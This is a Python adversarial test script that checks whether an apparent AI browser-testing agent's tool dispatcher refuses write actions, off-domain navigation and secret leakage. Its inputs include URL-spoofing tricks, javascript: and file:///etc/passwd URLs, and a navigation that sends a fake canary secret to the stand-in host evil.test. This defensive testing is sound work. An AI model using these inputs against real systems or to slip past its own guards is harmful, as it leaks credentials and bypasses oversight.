"""al3c-attack: adversarial test of AL3(c) through autotester.agents.tools.dispatch (HEAD copy).
Read-only sub-checker script. Temp data roots only, fake canary secret, no browser/model/network."""
from __future__ import annotations

import base64
import os
import csv
import hashlib
import sys
import tempfile
from collections import Counter
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

os.environ.setdefault("AUTOTESTER_APPROVAL_KEY", "test-only-signing-key-never-a-real-secret")
ROOT = Path("C:/Users/Lenovo/AppData/Local/Temp/chkA_t179r1_355800")
HEAD = ROOT / "head"
OUT = ROOT / "evidence" / "al3c-attack"
sys.path.insert(0, str(HEAD / "tests"))

import autotester  # noqa: E402
from autotester.agents import guards, tools  # noqa: E402
from autotester.agents.context import AgentContext  # noqa: E402
from autotester.browser.secrets import SecretStore, host_of  # noqa: E402
from autotester.providers.mock import MockProvider  # noqa: E402
from autotester.schema.agent_layer import RefusalClass  # noqa: E402
from autotester.schema.approval import RunApproval  # noqa: E402
from autotester.schema.case import Case  # noqa: E402
from autotester.schema.enums import (Action, ApprovalKind, CaseClass, CaseKind,  # noqa: E402
                                     Outcome, WritePolicy)
from autotester.schema.flowspec import ExpectedState, Step  # noqa: E402
from autotester.schema.project import Project, SecretRef  # noqa: E402
from autotester.schema.run import RawResult  # noqa: E402
from autotester.stages import execute  # noqa: E402
from autotester.store.project_store import ProjectStore  # noqa: E402

assert str(HEAD).replace("\\", "/").lower() in autotester.__file__.replace("\\", "/").lower(), \
    autotester.__file__
print("autotester.__file__ =", autotester.__file__)

BASE = "https://app.example.test"
CANARY = "CANARY-pw-7f3a9c"
A = Action
RO, TA, AW = WritePolicy.READ_ONLY, WritePolicy.TEST_ACCOUNT, WritePolicy.ALLOW_WRITES
REAL_RUN_CASE = execute.run_case
REFUSAL_OK = (RefusalClass.WRITE_POLICY, RefusalClass.DESTINATION)


def project(policy: WritePolicy = RO) -> Project:
    return Project(slug="demo", name="Demo", base_url=BASE, allowed_domains=["app.example.test"],
                   write_policy=policy,
                   secrets=[SecretRef(key="APP_PASS", domains=["app.example.test"])])


def S(order: int, action: Any, target: str = "x", value: str | None = None,
      expected: ExpectedState | None = None) -> Step:
    kw: dict[str, Any] = dict(order=order, action=action, target=target, value=value)
    if expected is not None:
        kw["expected"] = expected
    return Step(**kw)


def snapshot(root: Path) -> dict[str, str]:
    return {str(p.relative_to(root)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(root.rglob("*")) if p.is_file()}


class Counters:
    def __init__(self) -> None:
        self.sessions = 0
        self.run_case = 0


class _Sess:
    def __enter__(self) -> "_Sess":
        return self

    def __exit__(self, *e: object) -> None:
        return None


def _grant(store: ProjectStore, actions: int) -> None:
    store.add_approval(RunApproval(
        project="demo", run_kind=ApprovalKind.LIVE_CASE, target=BASE, scope="al3c fixture",
        max_actions=actions, wall_clock_s=900.0, granted_by="umesh",
        granted_at="2026-10-01", expires_at="2099-01-01").sign())


def _ctx(root: Path, policy: WritePolicy, cnt: Counters) -> AgentContext:
    proj = project(policy)
    store = ProjectStore("demo", root)
    store.paths.ensure()
    store.save_project(proj)

    def open_session(observer: object) -> Any:
        cnt.sessions += 1
        return _Sess()

    def spy_run_case(case: Case, session: Any) -> RawResult:
        cnt.run_case += 1
        return RawResult(case_id=case.id, outcome=Outcome.COMPLETED)

    execute.run_case = spy_run_case  # tools.execute is this same module object
    return AgentContext(project=proj, store=store, secrets=SecretStore(proj, {"APP_PASS": CANARY}),
                        judge=MockProvider(), run_id="run-1", open_session=open_session)


def _dispatch(ctx: AgentContext, root: Path, cnt: Counters, case_id: str,
              extra: dict[str, Any] | None = None) -> dict[str, Any]:
    before = snapshot(root)
    out = tools.dispatch(ctx, "run_case", {"case_id": case_id, **(extra or {})})
    after = snapshot(root)
    leaked = [p for p in after if CANARY in (root / p).read_text(errors="ignore") and p not in before]
    return {"out": out, "sessions": cnt.sessions, "run_case": cnt.run_case,
            "changed": before != after, "canary_new_files": leaked,
            "canary_in_out": CANARY in out.model_dump_json()}


def run_row(steps: list[Step], *, policy: WritePolicy = RO, login: bool = False,
            grant: bool = True, grant_actions: int = 1000,
            extra: dict[str, Any] | None = None) -> dict[str, Any]:
    with tempfile.TemporaryDirectory(prefix="al3c-") as tmp:
        root = Path(tmp)
        cnt = Counters()
        ctx = _ctx(root, policy, cnt)
        case = Case(project="demo", flow_id="f1", kind=CaseKind.BEST, case_class=CaseClass.HAPPY,
                    title="case", steps=steps)
        try:
            case = ctx.store.add_case(case)
        except Exception as exc:
            return {"setup_error": f"{type(exc).__name__}: {exc}"[:200]}
        if login:
            ctx.project = ctx.project.model_copy(update={"login_case_id": case.id})
        if grant:
            _grant(ctx.store, grant_actions)
        return _dispatch(ctx, root, cnt, case.id, extra)


ROWS: list[dict[str, Any]] = []


def record(group: str, rid: str, desc: str, expect: str, res: dict[str, Any], note: str = "") -> None:
    if "setup_error" in res:
        ROWS.append(dict(group=group, id=rid, desc=desc[:120], expect=expect, ok="", refusal="",
                         summary="", sessions="", run_case="", changed="", verdict="SETUP-ERROR",
                         note=res["setup_error"]))
        return
    out = res["out"]
    refused = ((not out.ok) and out.refusal in REFUSAL_OK and res["sessions"] == 0
               and res["run_case"] == 0 and not res["changed"])
    ran = out.ok and res["run_case"] == 1 and res["sessions"] == 1
    if expect == "REFUSED":
        verdict = "PASS" if refused else "DEVIATION"
    elif expect == "ALLOWED":
        verdict = "PASS" if ran else "DEVIATION"
    else:
        verdict = "ALLOWED" if ran else ("REFUSED" if refused else "OTHER")
    if res["canary_in_out"] or res["canary_new_files"]:
        note += f" CANARY-LEAK(out={res['canary_in_out']},files={res['canary_new_files']})"
    ROWS.append(dict(group=group, id=rid, desc=desc[:120], expect=expect, ok=out.ok,
                     refusal=out.refusal.value if out.refusal else "", summary=out.summary[:160],
                     sessions=res["sessions"], run_case=res["run_case"], changed=res["changed"],
                     verdict=verdict, note=note.strip()))


def one(group: str, rid: str, action: Action, target: str = "x", value: str | None = None,
        expect: str = "REFUSED", note: str = "", **kw: Any) -> None:
    desc = f"{action.value} target={target[:50]!r} value={value!r}"
    record(group, rid, desc, expect, run_row([S(1, action, target, value)], **kw), note)


# ---------------------------------------------------------------- group 1: cycle-0 list
n = 0
for t in ["Save", "Save changes", "Place order", "Confirm", "Apply now", "Register", "Sign up",
          "Add to cart", "Sign in", "खाता हटाएं", "Delete account", "Log out", ""]:
    n += 1
    one("1-cycle0", f"1.click.{n}", A.CLICK, t)
for v in [None, "Enter", "Delete", "Tab", "enter", " Enter ", "ENTER"]:
    n += 1
    one("1-cycle0", f"1.press.{n}", A.PRESS_KEY, "", v)
one("1-cycle0", "1.press.target", A.PRESS_KEY, "Search", None)
for u in [f"{BASE}/account/delete?id=1&confirm=1", f"{BASE}/logout", "https://evil.test/x",
          "javascript:alert(1)", "data:text/html,x", "/reports", "Admin portal URL", ""]:
    n += 1
    one("1-cycle0", f"1.nav.{n}", A.NAVIGATE, u)
for v in ["", "   ", None, "x"]:
    n += 1
    one("1-cycle0", f"1.fill.{n}", A.FILL, "Name", v)

# ---------------------------------------------------------------- group 2: every Action
READ_OR_NAV = {"wait", "assert", "back", "hover", "scroll", "navigate"}
for act in list(A):
    tgt = f"{BASE}/reports" if act is A.NAVIGATE else "Menu"
    for val in (None, "x"):
        exp = "ALLOWED" if act.value in READ_OR_NAV else "REFUSED"
        record("2-enum", f"2.{act.value}.{val}", f"{act.value} target={tgt!r} value={val!r}", exp,
               run_row([S(1, act, tgt, val)]))
print("Action members:", [a.value for a in A])


def validated(label: str, **kw: Any) -> str:
    try:
        Step(**kw)
        return f"{label}: Step() ACCEPTED"
    except Exception as exc:
        return f"{label}: Step() rejected ({type(exc).__name__})"


VAL_LOG = []
for av in ["submit", "eval", "CLICK", " click ", "click", "Click", "press_key", "PRESS_KEY"]:
    VAL_LOG.append(validated(f"action={av!r}", order=1, action=av, target="x"))
VAL_LOG.append(validated("extra field is_form_submit", order=1, action="wait", target="x",
                         is_form_submit=True))
VAL_LOG.append(validated("extra field force", order=1, action="click", target="x", force=True))


def mc_step(av: Any, target: str = "Save") -> Step:
    return Step.model_construct(order=1, action=av, target=target, value=None,
                                expected=ExpectedState(), source_ref=None, note=None,
                                screen_id=None, narration=None, on_screen_text=None)


def model_construct_row(av: Any) -> tuple[dict[str, Any], str]:
    st = mc_step(av)
    mc_case = Case.model_construct(id="cmc", project="demo", flow_id="f", kind=CaseKind.BEST,
                                   case_class=CaseClass.HAPPY, title="t", steps=[st])
    try:
        r = guards.write_policy_refusal(mc_case, project(RO))
        direct = f"guard returned {r[0].value if r else None}"
    except Exception as exc:
        direct = f"guard raised {type(exc).__name__}: {exc}"
    with tempfile.TemporaryDirectory(prefix="al3c-") as tmp:
        root = Path(tmp)
        cnt = Counters()
        ctx = _ctx(root, RO, cnt)
        ctx.store.get_case = lambda cid: mc_case  # type: ignore[method-assign]
        _grant(ctx.store, 50)
        return _dispatch(ctx, root, cnt, "cmc"), direct


for av in ["submit", "eval", "CLICK", " click ", "click", "wait", "navigate", "WAIT", "scroll", None, 5]:
    res, direct = model_construct_row(av)
    record("2b-construct", f"2b.{av!r}", f"model_construct action={av!r} target=Save", "REFUSED",
           res, f"direct: {direct}")
record("2b-construct", "2b.store-roundtrip-submit",
       "model_construct 'submit' written to store then dispatched", "REFUSED",
       run_row([mc_step("submit")]))

# ---------------------------------------------------------------- group 3: NAVIGATE tricks
long_path = "a" * 100_000
NAVS = [
    ("scheme case", "HTTPS://app.example.test/x"), ("proto-relative ok", "//app.example.test/x"),
    ("proto-relative evil", "//evil.test/x"), ("http:/ host", "http:/app.example.test/x"),
    ("http:host", "http:app.example.test/x"),
    ("userinfo", "https://app.example.test@evil.test/x"),
    ("evil#@", "https://evil.test#@app.example.test/"),
    ("evil?@", "https://evil.test?@app.example.test/"),
    ("evil backslash@", "https://evil.test\\@app.example.test/"),
    ("suffix evil", "https://app.example.test.evil.test/"),
    ("notapp", "https://notapp.example.test/"), ("evilapp", "https://evilapp.example.test/"),
    ("trailing dot", "https://app.example.test./x"), ("port", "https://app.example.test:8443/x"),
    ("bad port", "https://app.example.test:99999/x"),
    ("punycode lookalike", "https://xn--pp-example-test.example/"),
    ("fullwidth a", "https://\uff41pp.example.test/"), ("cyrillic a", "https://\u0430pp.example.test/"),
    ("%2e%2e/logout", "https://app.example.test/%2e%2e/logout"),
    ("encoded ?", "https://app.example.test/x%3Fid=1"),
    (";params", "https://app.example.test/x;id=1"),
    ("frag with ?", "https://app.example.test/x#frag?id=1"),
    ("SPA hash logout", "https://app.example.test/#/logout"),
    ("%6cogout", "https://app.example.test/%6cogout"), ("/Logout", "https://app.example.test/Logout"),
    ("log%00out", "https://app.example.test/log%00out"),
    ("%256cogout double-encoded", "https://app.example.test/%256cogout"),
    ("backslash path", "https://app.example.test/x\\y"),
    ("tab in path", "https://app.example.test/\tx"),
    ("newline in host", "https://app.exam\nple.test/"),
    ("100k URL", f"https://app.example.test/{long_path}"),
    ("/delete", "https://app.example.test/delete"),
    ("/deleted-items", "https://app.example.test/deleted-items"),
    ("/api/close-account", "https://app.example.test/api/close-account"),
    ("/api/delete", "https://app.example.test/api/delete"),
    ("/logoff", "https://app.example.test/logoff"), ("/sign-off", "https://app.example.test/sign-off"),
    ("/signoff", "https://app.example.test/signoff"), ("/sign-out", "https://app.example.test/sign-out"),
    ("/orders/42/cancel", "https://app.example.test/orders/42/cancel"),
    ("/session/destroy", "https://app.example.test/session/destroy"),
    ("/exit", "https://app.example.test/exit"),
    ("/invite/accept", "https://app.example.test/invite/accept"),
    ("/log%2Dout", "https://app.example.test/log%2Dout"),
    ("/log%20out", "https://app.example.test/log%20out"),
    ("/users/42/remove", "https://app.example.test/users/42/remove"),
    ("/checkout", "https://app.example.test/checkout"),
    ("/unsubscribe", "https://app.example.test/unsubscribe"),
    ("empty query x?", "https://app.example.test/x?"), ("empty frag x#", "https://app.example.test/x#"),
    ("no path", "https://app.example.test"), ("subdomain", "https://sub.app.example.test/x"),
    ("surrounding spaces", "  https://app.example.test/x  "),
    ("nbsp lead", "\u00a0https://app.example.test/x"),
    ("file", "file:///etc/passwd"), ("ftp", "ftp://app.example.test/"),
    ("blob", "blob:https://app.example.test/x"),
    ("view-source", "view-source:https://app.example.test/"),
    ("about:blank", "about:blank"), ("chrome", "chrome://settings"),
    ("JAVASCRIPT upper", "JAVASCRIPT:alert(1)"), ("java<tab>script", "java\tscript:alert(1)"),
    ("localhost:8080", "localhost:8080/x"), ("bare host path", "app.example.test/reports"),
    ("unterminated [", "http://[::1"), ("http:[::1 (no //)", "http:[::1"),
    ("http:/[x", "http:/[x"), ("https:[a]b", "https:[a"), ("https:///evil", "https:///evil.test/x"),
    ("%2e in host", "https://app.example.test%2eevil.test/"),
    ("[host] brackets", "https://[app.example.test]/x"),
    ("evil%2f.app suffix", "https://evil.test%2f.app.example.test/"),
    ("evil%2e.app suffix", "https://evil.test%2e.app.example.test/"),
    ("app%2fevil", "https://app.example.test%2fevil.test/"),
    ("ideographic full stop", "https://app。example。test/x"),
    ("empty port", "https://app.example.test:/x"), ("port 80 on https", "https://app.example.test:80/x"),
    ("user@ empty", "https://:@app.example.test/x"),
    ("evil:80.app suffix", "https://evil.test:80.app.example.test/"),
    ("logout in query-less userinfo-free", "https://app.example.test/a/b/../../logout"),
    ("dot-segment before logout", "https://app.example.test/a/./logout"),
    ("logout semicolon", "https://app.example.test/logout;jsessionid=1"),
    ("query ?a=1", "https://app.example.test/reports?a=1"),
    ("confirm token path", "https://app.example.test/confirm/abc123"),
    ("placeholder host", "https://{{SECRET:APP_PASS}}.example.test/"),
    ("placeholder path", f"{BASE}/x/{{{{SECRET:APP_PASS}}}}"),
]
for i, (label, url) in enumerate(NAVS):
    try:
        host = host_of(url.strip())
    except Exception as exc:
        host = f"host_of RAISED {type(exc).__name__}"
    res = run_row([S(1, A.NAVIGATE, url)])
    res_aw = run_row([S(1, A.NAVIGATE, url)], policy=AW)
    aw = "ok" if res_aw["out"].ok else (res_aw["out"].refusal.value if res_aw["out"].refusal else "?")
    record("3-navigate", f"3.{i}.{label}", f"navigate {url[:70]!r}", "OBSERVE", res,
           f"host_of={host!r}; ALLOW_WRITES -> {aw}")

# ---------------------------------------------------------------- group 5: multi-step
MULTI = {
    "5.nav-assert-save": [S(1, A.NAVIGATE, f"{BASE}/reports"), S(2, A.ASSERT), S(3, A.CLICK, "Save")],
    "5.save-first": [S(1, A.CLICK, "Save"), S(2, A.NAVIGATE, f"{BASE}/reports")],
    "5.five-reads-fill": [S(1, A.WAIT), S(2, A.ASSERT), S(3, A.HOVER, "m"), S(4, A.SCROLL, "x", "100"),
                          S(5, A.BACK), S(6, A.FILL, "Name", "x")],
    "5.order-out-of-order": [S(3, A.CLICK, "Save"), S(1, A.NAVIGATE, f"{BASE}/reports"), S(2, A.ASSERT)],
    "5.order-dup-nav-first": [S(1, A.NAVIGATE, f"{BASE}/reports"), S(1, A.CLICK, "Save")],
    "5.order-dup-click-first": [S(1, A.CLICK, "Save"), S(1, A.NAVIGATE, f"{BASE}/reports")],
    "5.order-zero": [S(1, A.NAVIGATE, f"{BASE}/reports"), S(0, A.FILL, "Name", "x")],
    "5.order-negative": [S(5, A.NAVIGATE, f"{BASE}/reports"), S(-3, A.CLICK, "Save")],
    "5.order-huge": [S(2**62, A.CLICK, "Save"), S(1, A.WAIT)],
    "5.300-last-fill": [S(i, A.WAIT) for i in range(1, 300)] + [S(300, A.FILL, "Name", "x")],
    "5.300-last-click": [S(i, A.HOVER, "m") for i in range(1, 300)] + [S(300, A.CLICK, "Save")],
    "5.300-first-click": [S(1, A.CLICK, "Save")] + [S(i, A.WAIT) for i in range(2, 301)],
}
for rid, steps in MULTI.items():
    record("5-multi", rid, f"{len(steps)} steps: " + ",".join(
        f"{s.order}:{s.action.value}" for s in steps[:6]), "REFUSED", run_row(steps))
record("5-multi", "5.300-all-reads", "300 WAIT steps", "ALLOWED",
       run_row([S(i, A.WAIT) for i in range(1, 301)]))
record("5-multi", "5.no-approval-click", "CLICK Save, NO approval", "REFUSED",
       run_row([S(1, A.CLICK, "Save")], grant=False), "write_policy check must precede approval")

# ---------------------------------------------------------------- group 6: allowed rows
one("6-allowed", "6.wait", A.WAIT, "", None, "ALLOWED")
one("6-allowed", "6.wait-sel", A.WAIT, 'role=button[name="Go"]', "500", "ALLOWED")
record("6-allowed", "6.assert", "ASSERT visible_text", "ALLOWED",
       run_row([S(1, A.ASSERT, "", None, ExpectedState(visible_text=["Reports"]))]))
one("6-allowed", "6.back", A.BACK, "", None, "ALLOWED")
one("6-allowed", "6.hover", A.HOVER, "Menu", None, "ALLOWED")
one("6-allowed", "6.scroll", A.SCROLL, "", "400", "ALLOWED")
one("6-allowed", "6.nav-reports", A.NAVIGATE, f"{BASE}/reports", None, "ALLOWED")
record("6-allowed", "6.multi-reads", "nav, wait, assert, hover, scroll, back", "ALLOWED",
       run_row([S(1, A.NAVIGATE, f"{BASE}/reports"), S(2, A.WAIT), S(3, A.ASSERT), S(4, A.HOVER, "m"),
                S(5, A.SCROLL, "", "300"), S(6, A.BACK)]))

# ---------------------------------------------------------------- group 4: read actions with payloads
exp_all = ExpectedState(url="/x", visible_text=["a"], absent_text=["b"], dom_asserts=["button#delete"],
                        network=["POST /api/delete"], visual_signal="v")
one("4-readpayload", "4.hover-delete", A.HOVER, "Delete account", None, "ALLOWED",
    "hover on a deny-listed name")
one("4-readpayload", "4.hover-logout", A.HOVER, "Log out", None, "ALLOWED")
one("4-readpayload", "4.scroll-abc", A.SCROLL, "", "abc", "ALLOWED",
    "guard allows; executor int('abc') -> ERRORED")
one("4-readpayload", "4.wait-sel-big", A.WAIT, "button", "999999999", "ALLOWED")
one("4-readpayload", "4.wait-text-engine", A.WAIT, "text=Delete account >> nth=0", None, "ALLOWED")
record("4-readpayload", "4.assert-all", "ASSERT with every ExpectedState field", "ALLOWED",
       run_row([S(1, A.ASSERT, "", None, exp_all)]))
record("4-readpayload", "4.hover-with-expected", "HOVER with expected dom_asserts", "ALLOWED",
       run_row([S(1, A.HOVER, "m", None, ExpectedState(dom_asserts=["text=Delete"]))]))
one("4-readpayload", "4.wait-xpath", A.WAIT, "xpath=//button[@onclick='deleteAll()']", None, "ALLOWED")

# ---------------------------------------------------------------- group 7: secrets in targets
RAWB64 = base64.b64encode(CANARY.encode()).decode()
for rid, act, tgt, val in [
    ("7.click-placeholder", A.CLICK, "{{SECRET:APP_PASS}}", None),
    ("7.click-raw", A.CLICK, CANARY, None),
    ("7.click-raw-b64", A.CLICK, RAWB64, None),
    ("7.click-raw-reversed", A.CLICK, CANARY[::-1], None),
    ("7.fill-placeholder", A.FILL, "Password", "{{SECRET:APP_PASS}}"),
    ("7.fill-raw-value", A.FILL, "Password", CANARY),
    ("7.fill-raw-target", A.FILL, CANARY, "x"),
    ("7.nav-raw-in-domain", A.NAVIGATE, f"{BASE}/x/{CANARY}", None),
    ("7.nav-raw-evil", A.NAVIGATE, f"https://evil.test/{CANARY}", None),
    ("7.nav-placeholder", A.NAVIGATE, f"{BASE}/x/{{{{SECRET:APP_PASS}}}}", None),
    ("7.hover-raw", A.HOVER, CANARY, None),
    ("7.press-raw-value", A.PRESS_KEY, "", CANARY),
]:
    exp = "OBSERVE" if rid in ("7.hover-raw", "7.nav-raw-in-domain") else "REFUSED"
    one("7-secret", rid, act, tgt, val, exp)

# ---------------------------------------------------------------- group 8: declared login case
CRED = "{{SECRET:APP_PASS}}"
DEL = 'role=button[name="Delete account"]'
LOGOUT = 'role=button[name="Log out"]'
LOGIN = {
    "8.fill-cred-click-signin": ([S(1, A.FILL, "Password", CRED), S(2, A.CLICK, "Sign in")], "ALLOWED"),
    "8.fill-cred-enter": ([S(1, A.FILL, "Password", CRED), S(2, A.PRESS_KEY, "", None)], "ALLOWED"),
    "8.click-first": ([S(1, A.CLICK, "Sign in")], "REFUSED"),
    "8.fill-cred-click-delete": ([S(1, A.FILL, "Password", CRED), S(2, A.CLICK, "Delete account")], "REFUSED"),
    "8.fill-cred-click-logout": ([S(1, A.FILL, "Password", CRED), S(2, A.CLICK, "Log out")], "REFUSED"),
    "8.fill-cred-click-placeorder": ([S(1, A.FILL, "Password", CRED), S(2, A.CLICK, "Place order")], "OBSERVE"),
    "8.fill-cred-enter-on-delete-target": ([S(1, A.FILL, "Password", CRED),
                                            S(2, A.PRESS_KEY, DEL, "Enter")], "OBSERVE"),
    "8.fill-cred-enter-on-logout-target": ([S(1, A.FILL, "Password", CRED),
                                            S(2, A.PRESS_KEY, LOGOUT, None)], "OBSERVE"),
    "8.fill-cred-into-delete-field-then-click": ([S(1, A.FILL, DEL, CRED), S(2, A.CLICK, "Sign in")], "OBSERVE"),
    "8.two-submits-one-cred": ([S(1, A.FILL, "Password", CRED), S(2, A.CLICK, "Sign in"),
                                S(3, A.CLICK, "Save")], "REFUSED"),
    "8.two-enter-one-cred": ([S(1, A.FILL, "Password", CRED), S(2, A.PRESS_KEY, "", "Enter"),
                              S(3, A.PRESS_KEY, "", "Enter")], "REFUSED"),
    "8.fill-plain-text": ([S(1, A.FILL, "Name", "x"), S(2, A.CLICK, "Sign in")], "REFUSED"),
    "8.fill-cred-plus-text": ([S(1, A.FILL, "Password", CRED + "x"), S(2, A.CLICK, "Sign in")], "REFUSED"),
    "8.fill-undeclared-key": ([S(1, A.FILL, "Password", "{{SECRET:OTHER}}"), S(2, A.CLICK, "Sign in")], "REFUSED"),
    "8.fill-cred-select": ([S(1, A.FILL, "Password", CRED), S(2, A.SELECT, "Plan", "pro")], "REFUSED"),
    "8.fill-cred-upload": ([S(1, A.FILL, "Password", CRED), S(2, A.UPLOAD, "CV", "cv.pdf")], "REFUSED"),
    "8.fill-cred-then-nav-query": ([S(1, A.FILL, "Password", CRED),
                                    S(2, A.NAVIGATE, f"{BASE}/a?delete=1")], "OBSERVE"),
    "8.fill-cred-then-nav-logout": ([S(1, A.FILL, "Password", CRED),
                                     S(2, A.NAVIGATE, f"{BASE}/logout")], "REFUSED"),
    "8.nav-with-query-login": ([S(1, A.NAVIGATE, f"{BASE}/login?next=/delete&action=delete")], "OBSERVE"),
    "8.nav-with-query-nonlogin": ([S(1, A.NAVIGATE, f"{BASE}/login?next=/home")], "REFUSED"),
}
for rid, (steps, exp) in LOGIN.items():
    record("8-login", rid, ",".join(f"{s.action.value}({s.target[:30]},{s.value})" for s in steps), exp,
           run_row(steps, login=True))
record("8-login", "8.NOT-login-fill-cred-click-signin",
       "same as login row 1 but case is NOT the declared login case", "REFUSED",
       run_row([S(1, A.FILL, "Password", CRED), S(2, A.CLICK, "Sign in")], login=False))

# ---------------------------------------------------------------- group 10: args injection + echo size
for rid, extra in [("10.extra-write-policy", {"write_policy": "allow_writes"}),
                   ("10.extra-project", {"project": "other"}), ("10.extra-steps", {"steps": []}),
                   ("10.extra-approval", {"approval": "x"})]:
    record("10-args", rid, f"CLICK Save + extra args {extra}", "REFUSED",
           run_row([S(1, A.CLICK, "Save")], extra=extra))
big = "B" * 100_000
record("10-args", "10.huge-click-target-echo", "CLICK with 100k-char target", "REFUSED",
       run_row([S(1, A.CLICK, big)]))
HUGE_LEN = len(tools.dispatch.__globals__["_refusal"]("run_case", RefusalClass.WRITE_POLICY, "x").summary)
res_big = run_row([S(1, A.CLICK, big)])
BIG_SUMMARY_LEN = len(res_big["out"].summary)
res_store = run_row([mc_step("submit")])
STORE_SUMMARY = res_store["out"].summary

# ---------------------------------------------------------------- group 9: other policies, contrast
for pol in (TA, AW):
    for rid, act, tgt, val in [("click-save", A.CLICK, "Save", None), ("click-logout", A.CLICK, "Log out", None),
                               ("click-delete", A.CLICK, "Delete account", None), ("fill", A.FILL, "Name", "x")]:
        record("9-contrast", f"9.{pol.value}.{rid}", f"{act.value} {tgt}", "OBSERVE",
               run_row([S(1, act, tgt, val)], policy=pol))


# ---------------------------------------------------------------- group 4b: dynamic run of the real executor
def dynamic_reads() -> list[str]:
    """REAL execute.run_case over every READ_ONLY-allowed step kind on a MagicMock page; list the
    page-level calls it makes."""
    from autotester.browser.session import BrowserSession
    lines: list[str] = []
    execute.run_case = REAL_RUN_CASE
    with tempfile.TemporaryDirectory(prefix="al3c-dyn-") as tmp:
        root = Path(tmp)
        proj = project(RO)
        store = ProjectStore("demo", root)
        store.paths.ensure()
        secrets = SecretStore(proj, {"APP_PASS": CANARY})
        cases = {
            "NAVIGATE": [S(1, A.NAVIGATE, f"{BASE}/reports")],
            "WAIT(sel,50)": [S(1, A.WAIT, "button", "50")], "WAIT(none)": [S(1, A.WAIT, "", None)],
            "ASSERT(all fields)": [S(1, A.ASSERT, "", None, exp_all)],
            "BACK": [S(1, A.BACK, "", None)], "HOVER(Delete account)": [S(1, A.HOVER, "Delete account", None)],
            "SCROLL(400)": [S(1, A.SCROLL, "", "400")], "SCROLL(abc)": [S(1, A.SCROLL, "", "abc")],
            "HOVER+expected(url,dom)": [S(1, A.HOVER, "m", None,
                                          ExpectedState(url="/x", dom_asserts=["b"]))],
        }
        keys = (".click", ".fill", ".press", ".type(", "dispatch_event", "set_input_files",
                "select_option", ".check(", "evaluate", "keyboard", "request", "route", "goto",
                "go_back", "hover", "wheel", "reload", "tap", "add_style_tag", "screenshot")
        for name, steps in cases.items():
            sess = BrowserSession(proj, secrets, root / "run", paths=store.paths)
            page = MagicMock()
            page.url = f"{BASE}/reports"
            page.locator.return_value.count.return_value = 1
            page.locator.return_value.inner_text.return_value = "a"
            sess._page = page
            case = Case(project="demo", flow_id="f", kind=CaseKind.BEST, case_class=CaseClass.HAPPY,
                        title=name, steps=steps)
            res = REAL_RUN_CASE(case, sess)
            calls = [str(c) for c in page.mock_calls]
            interesting = [c for c in calls if any(k in c for k in keys)]
            lines.append(f"{name}: outcome={res.outcome.value} err={res.error}\n    page calls: {interesting}")
    return lines


DYN = dynamic_reads()

# ---------------------------------------------------------------- outputs
fields = ["group", "id", "desc", "expect", "ok", "refusal", "summary", "sessions", "run_case",
          "changed", "verdict", "note"]
with (OUT / "raw_table.csv").open("w", newline="", encoding="utf-8") as fh:
    w = csv.DictWriter(fh, fieldnames=fields)
    w.writeheader()
    w.writerows(ROWS)
(OUT / "step_validation.txt").write_text("\n".join(VAL_LOG), encoding="utf-8")
(OUT / "extra_facts.txt").write_text("huge-click-target summary length=" + str(BIG_SUMMARY_LEN) + "\nstore-roundtrip summary=" + repr(STORE_SUMMARY) + "\n", encoding="utf-8")
(OUT / "dynamic_reads.txt").write_text("\n".join(DYN), encoding="utf-8")
print(sorted(Counter((r["group"], r["verdict"]) for r in ROWS).items()))
print("\n".join(VAL_LOG))
print("\n".join(DYN))
for r in ROWS:
    if r["verdict"] in ("DEVIATION", "OTHER", "SETUP-ERROR") or "LEAK" in r["note"]:
        print("DEV:", r["id"], "|", r["expect"], r["ok"], r["refusal"], r["summary"], r["sessions"],
              r["run_case"], r["changed"], r["note"])
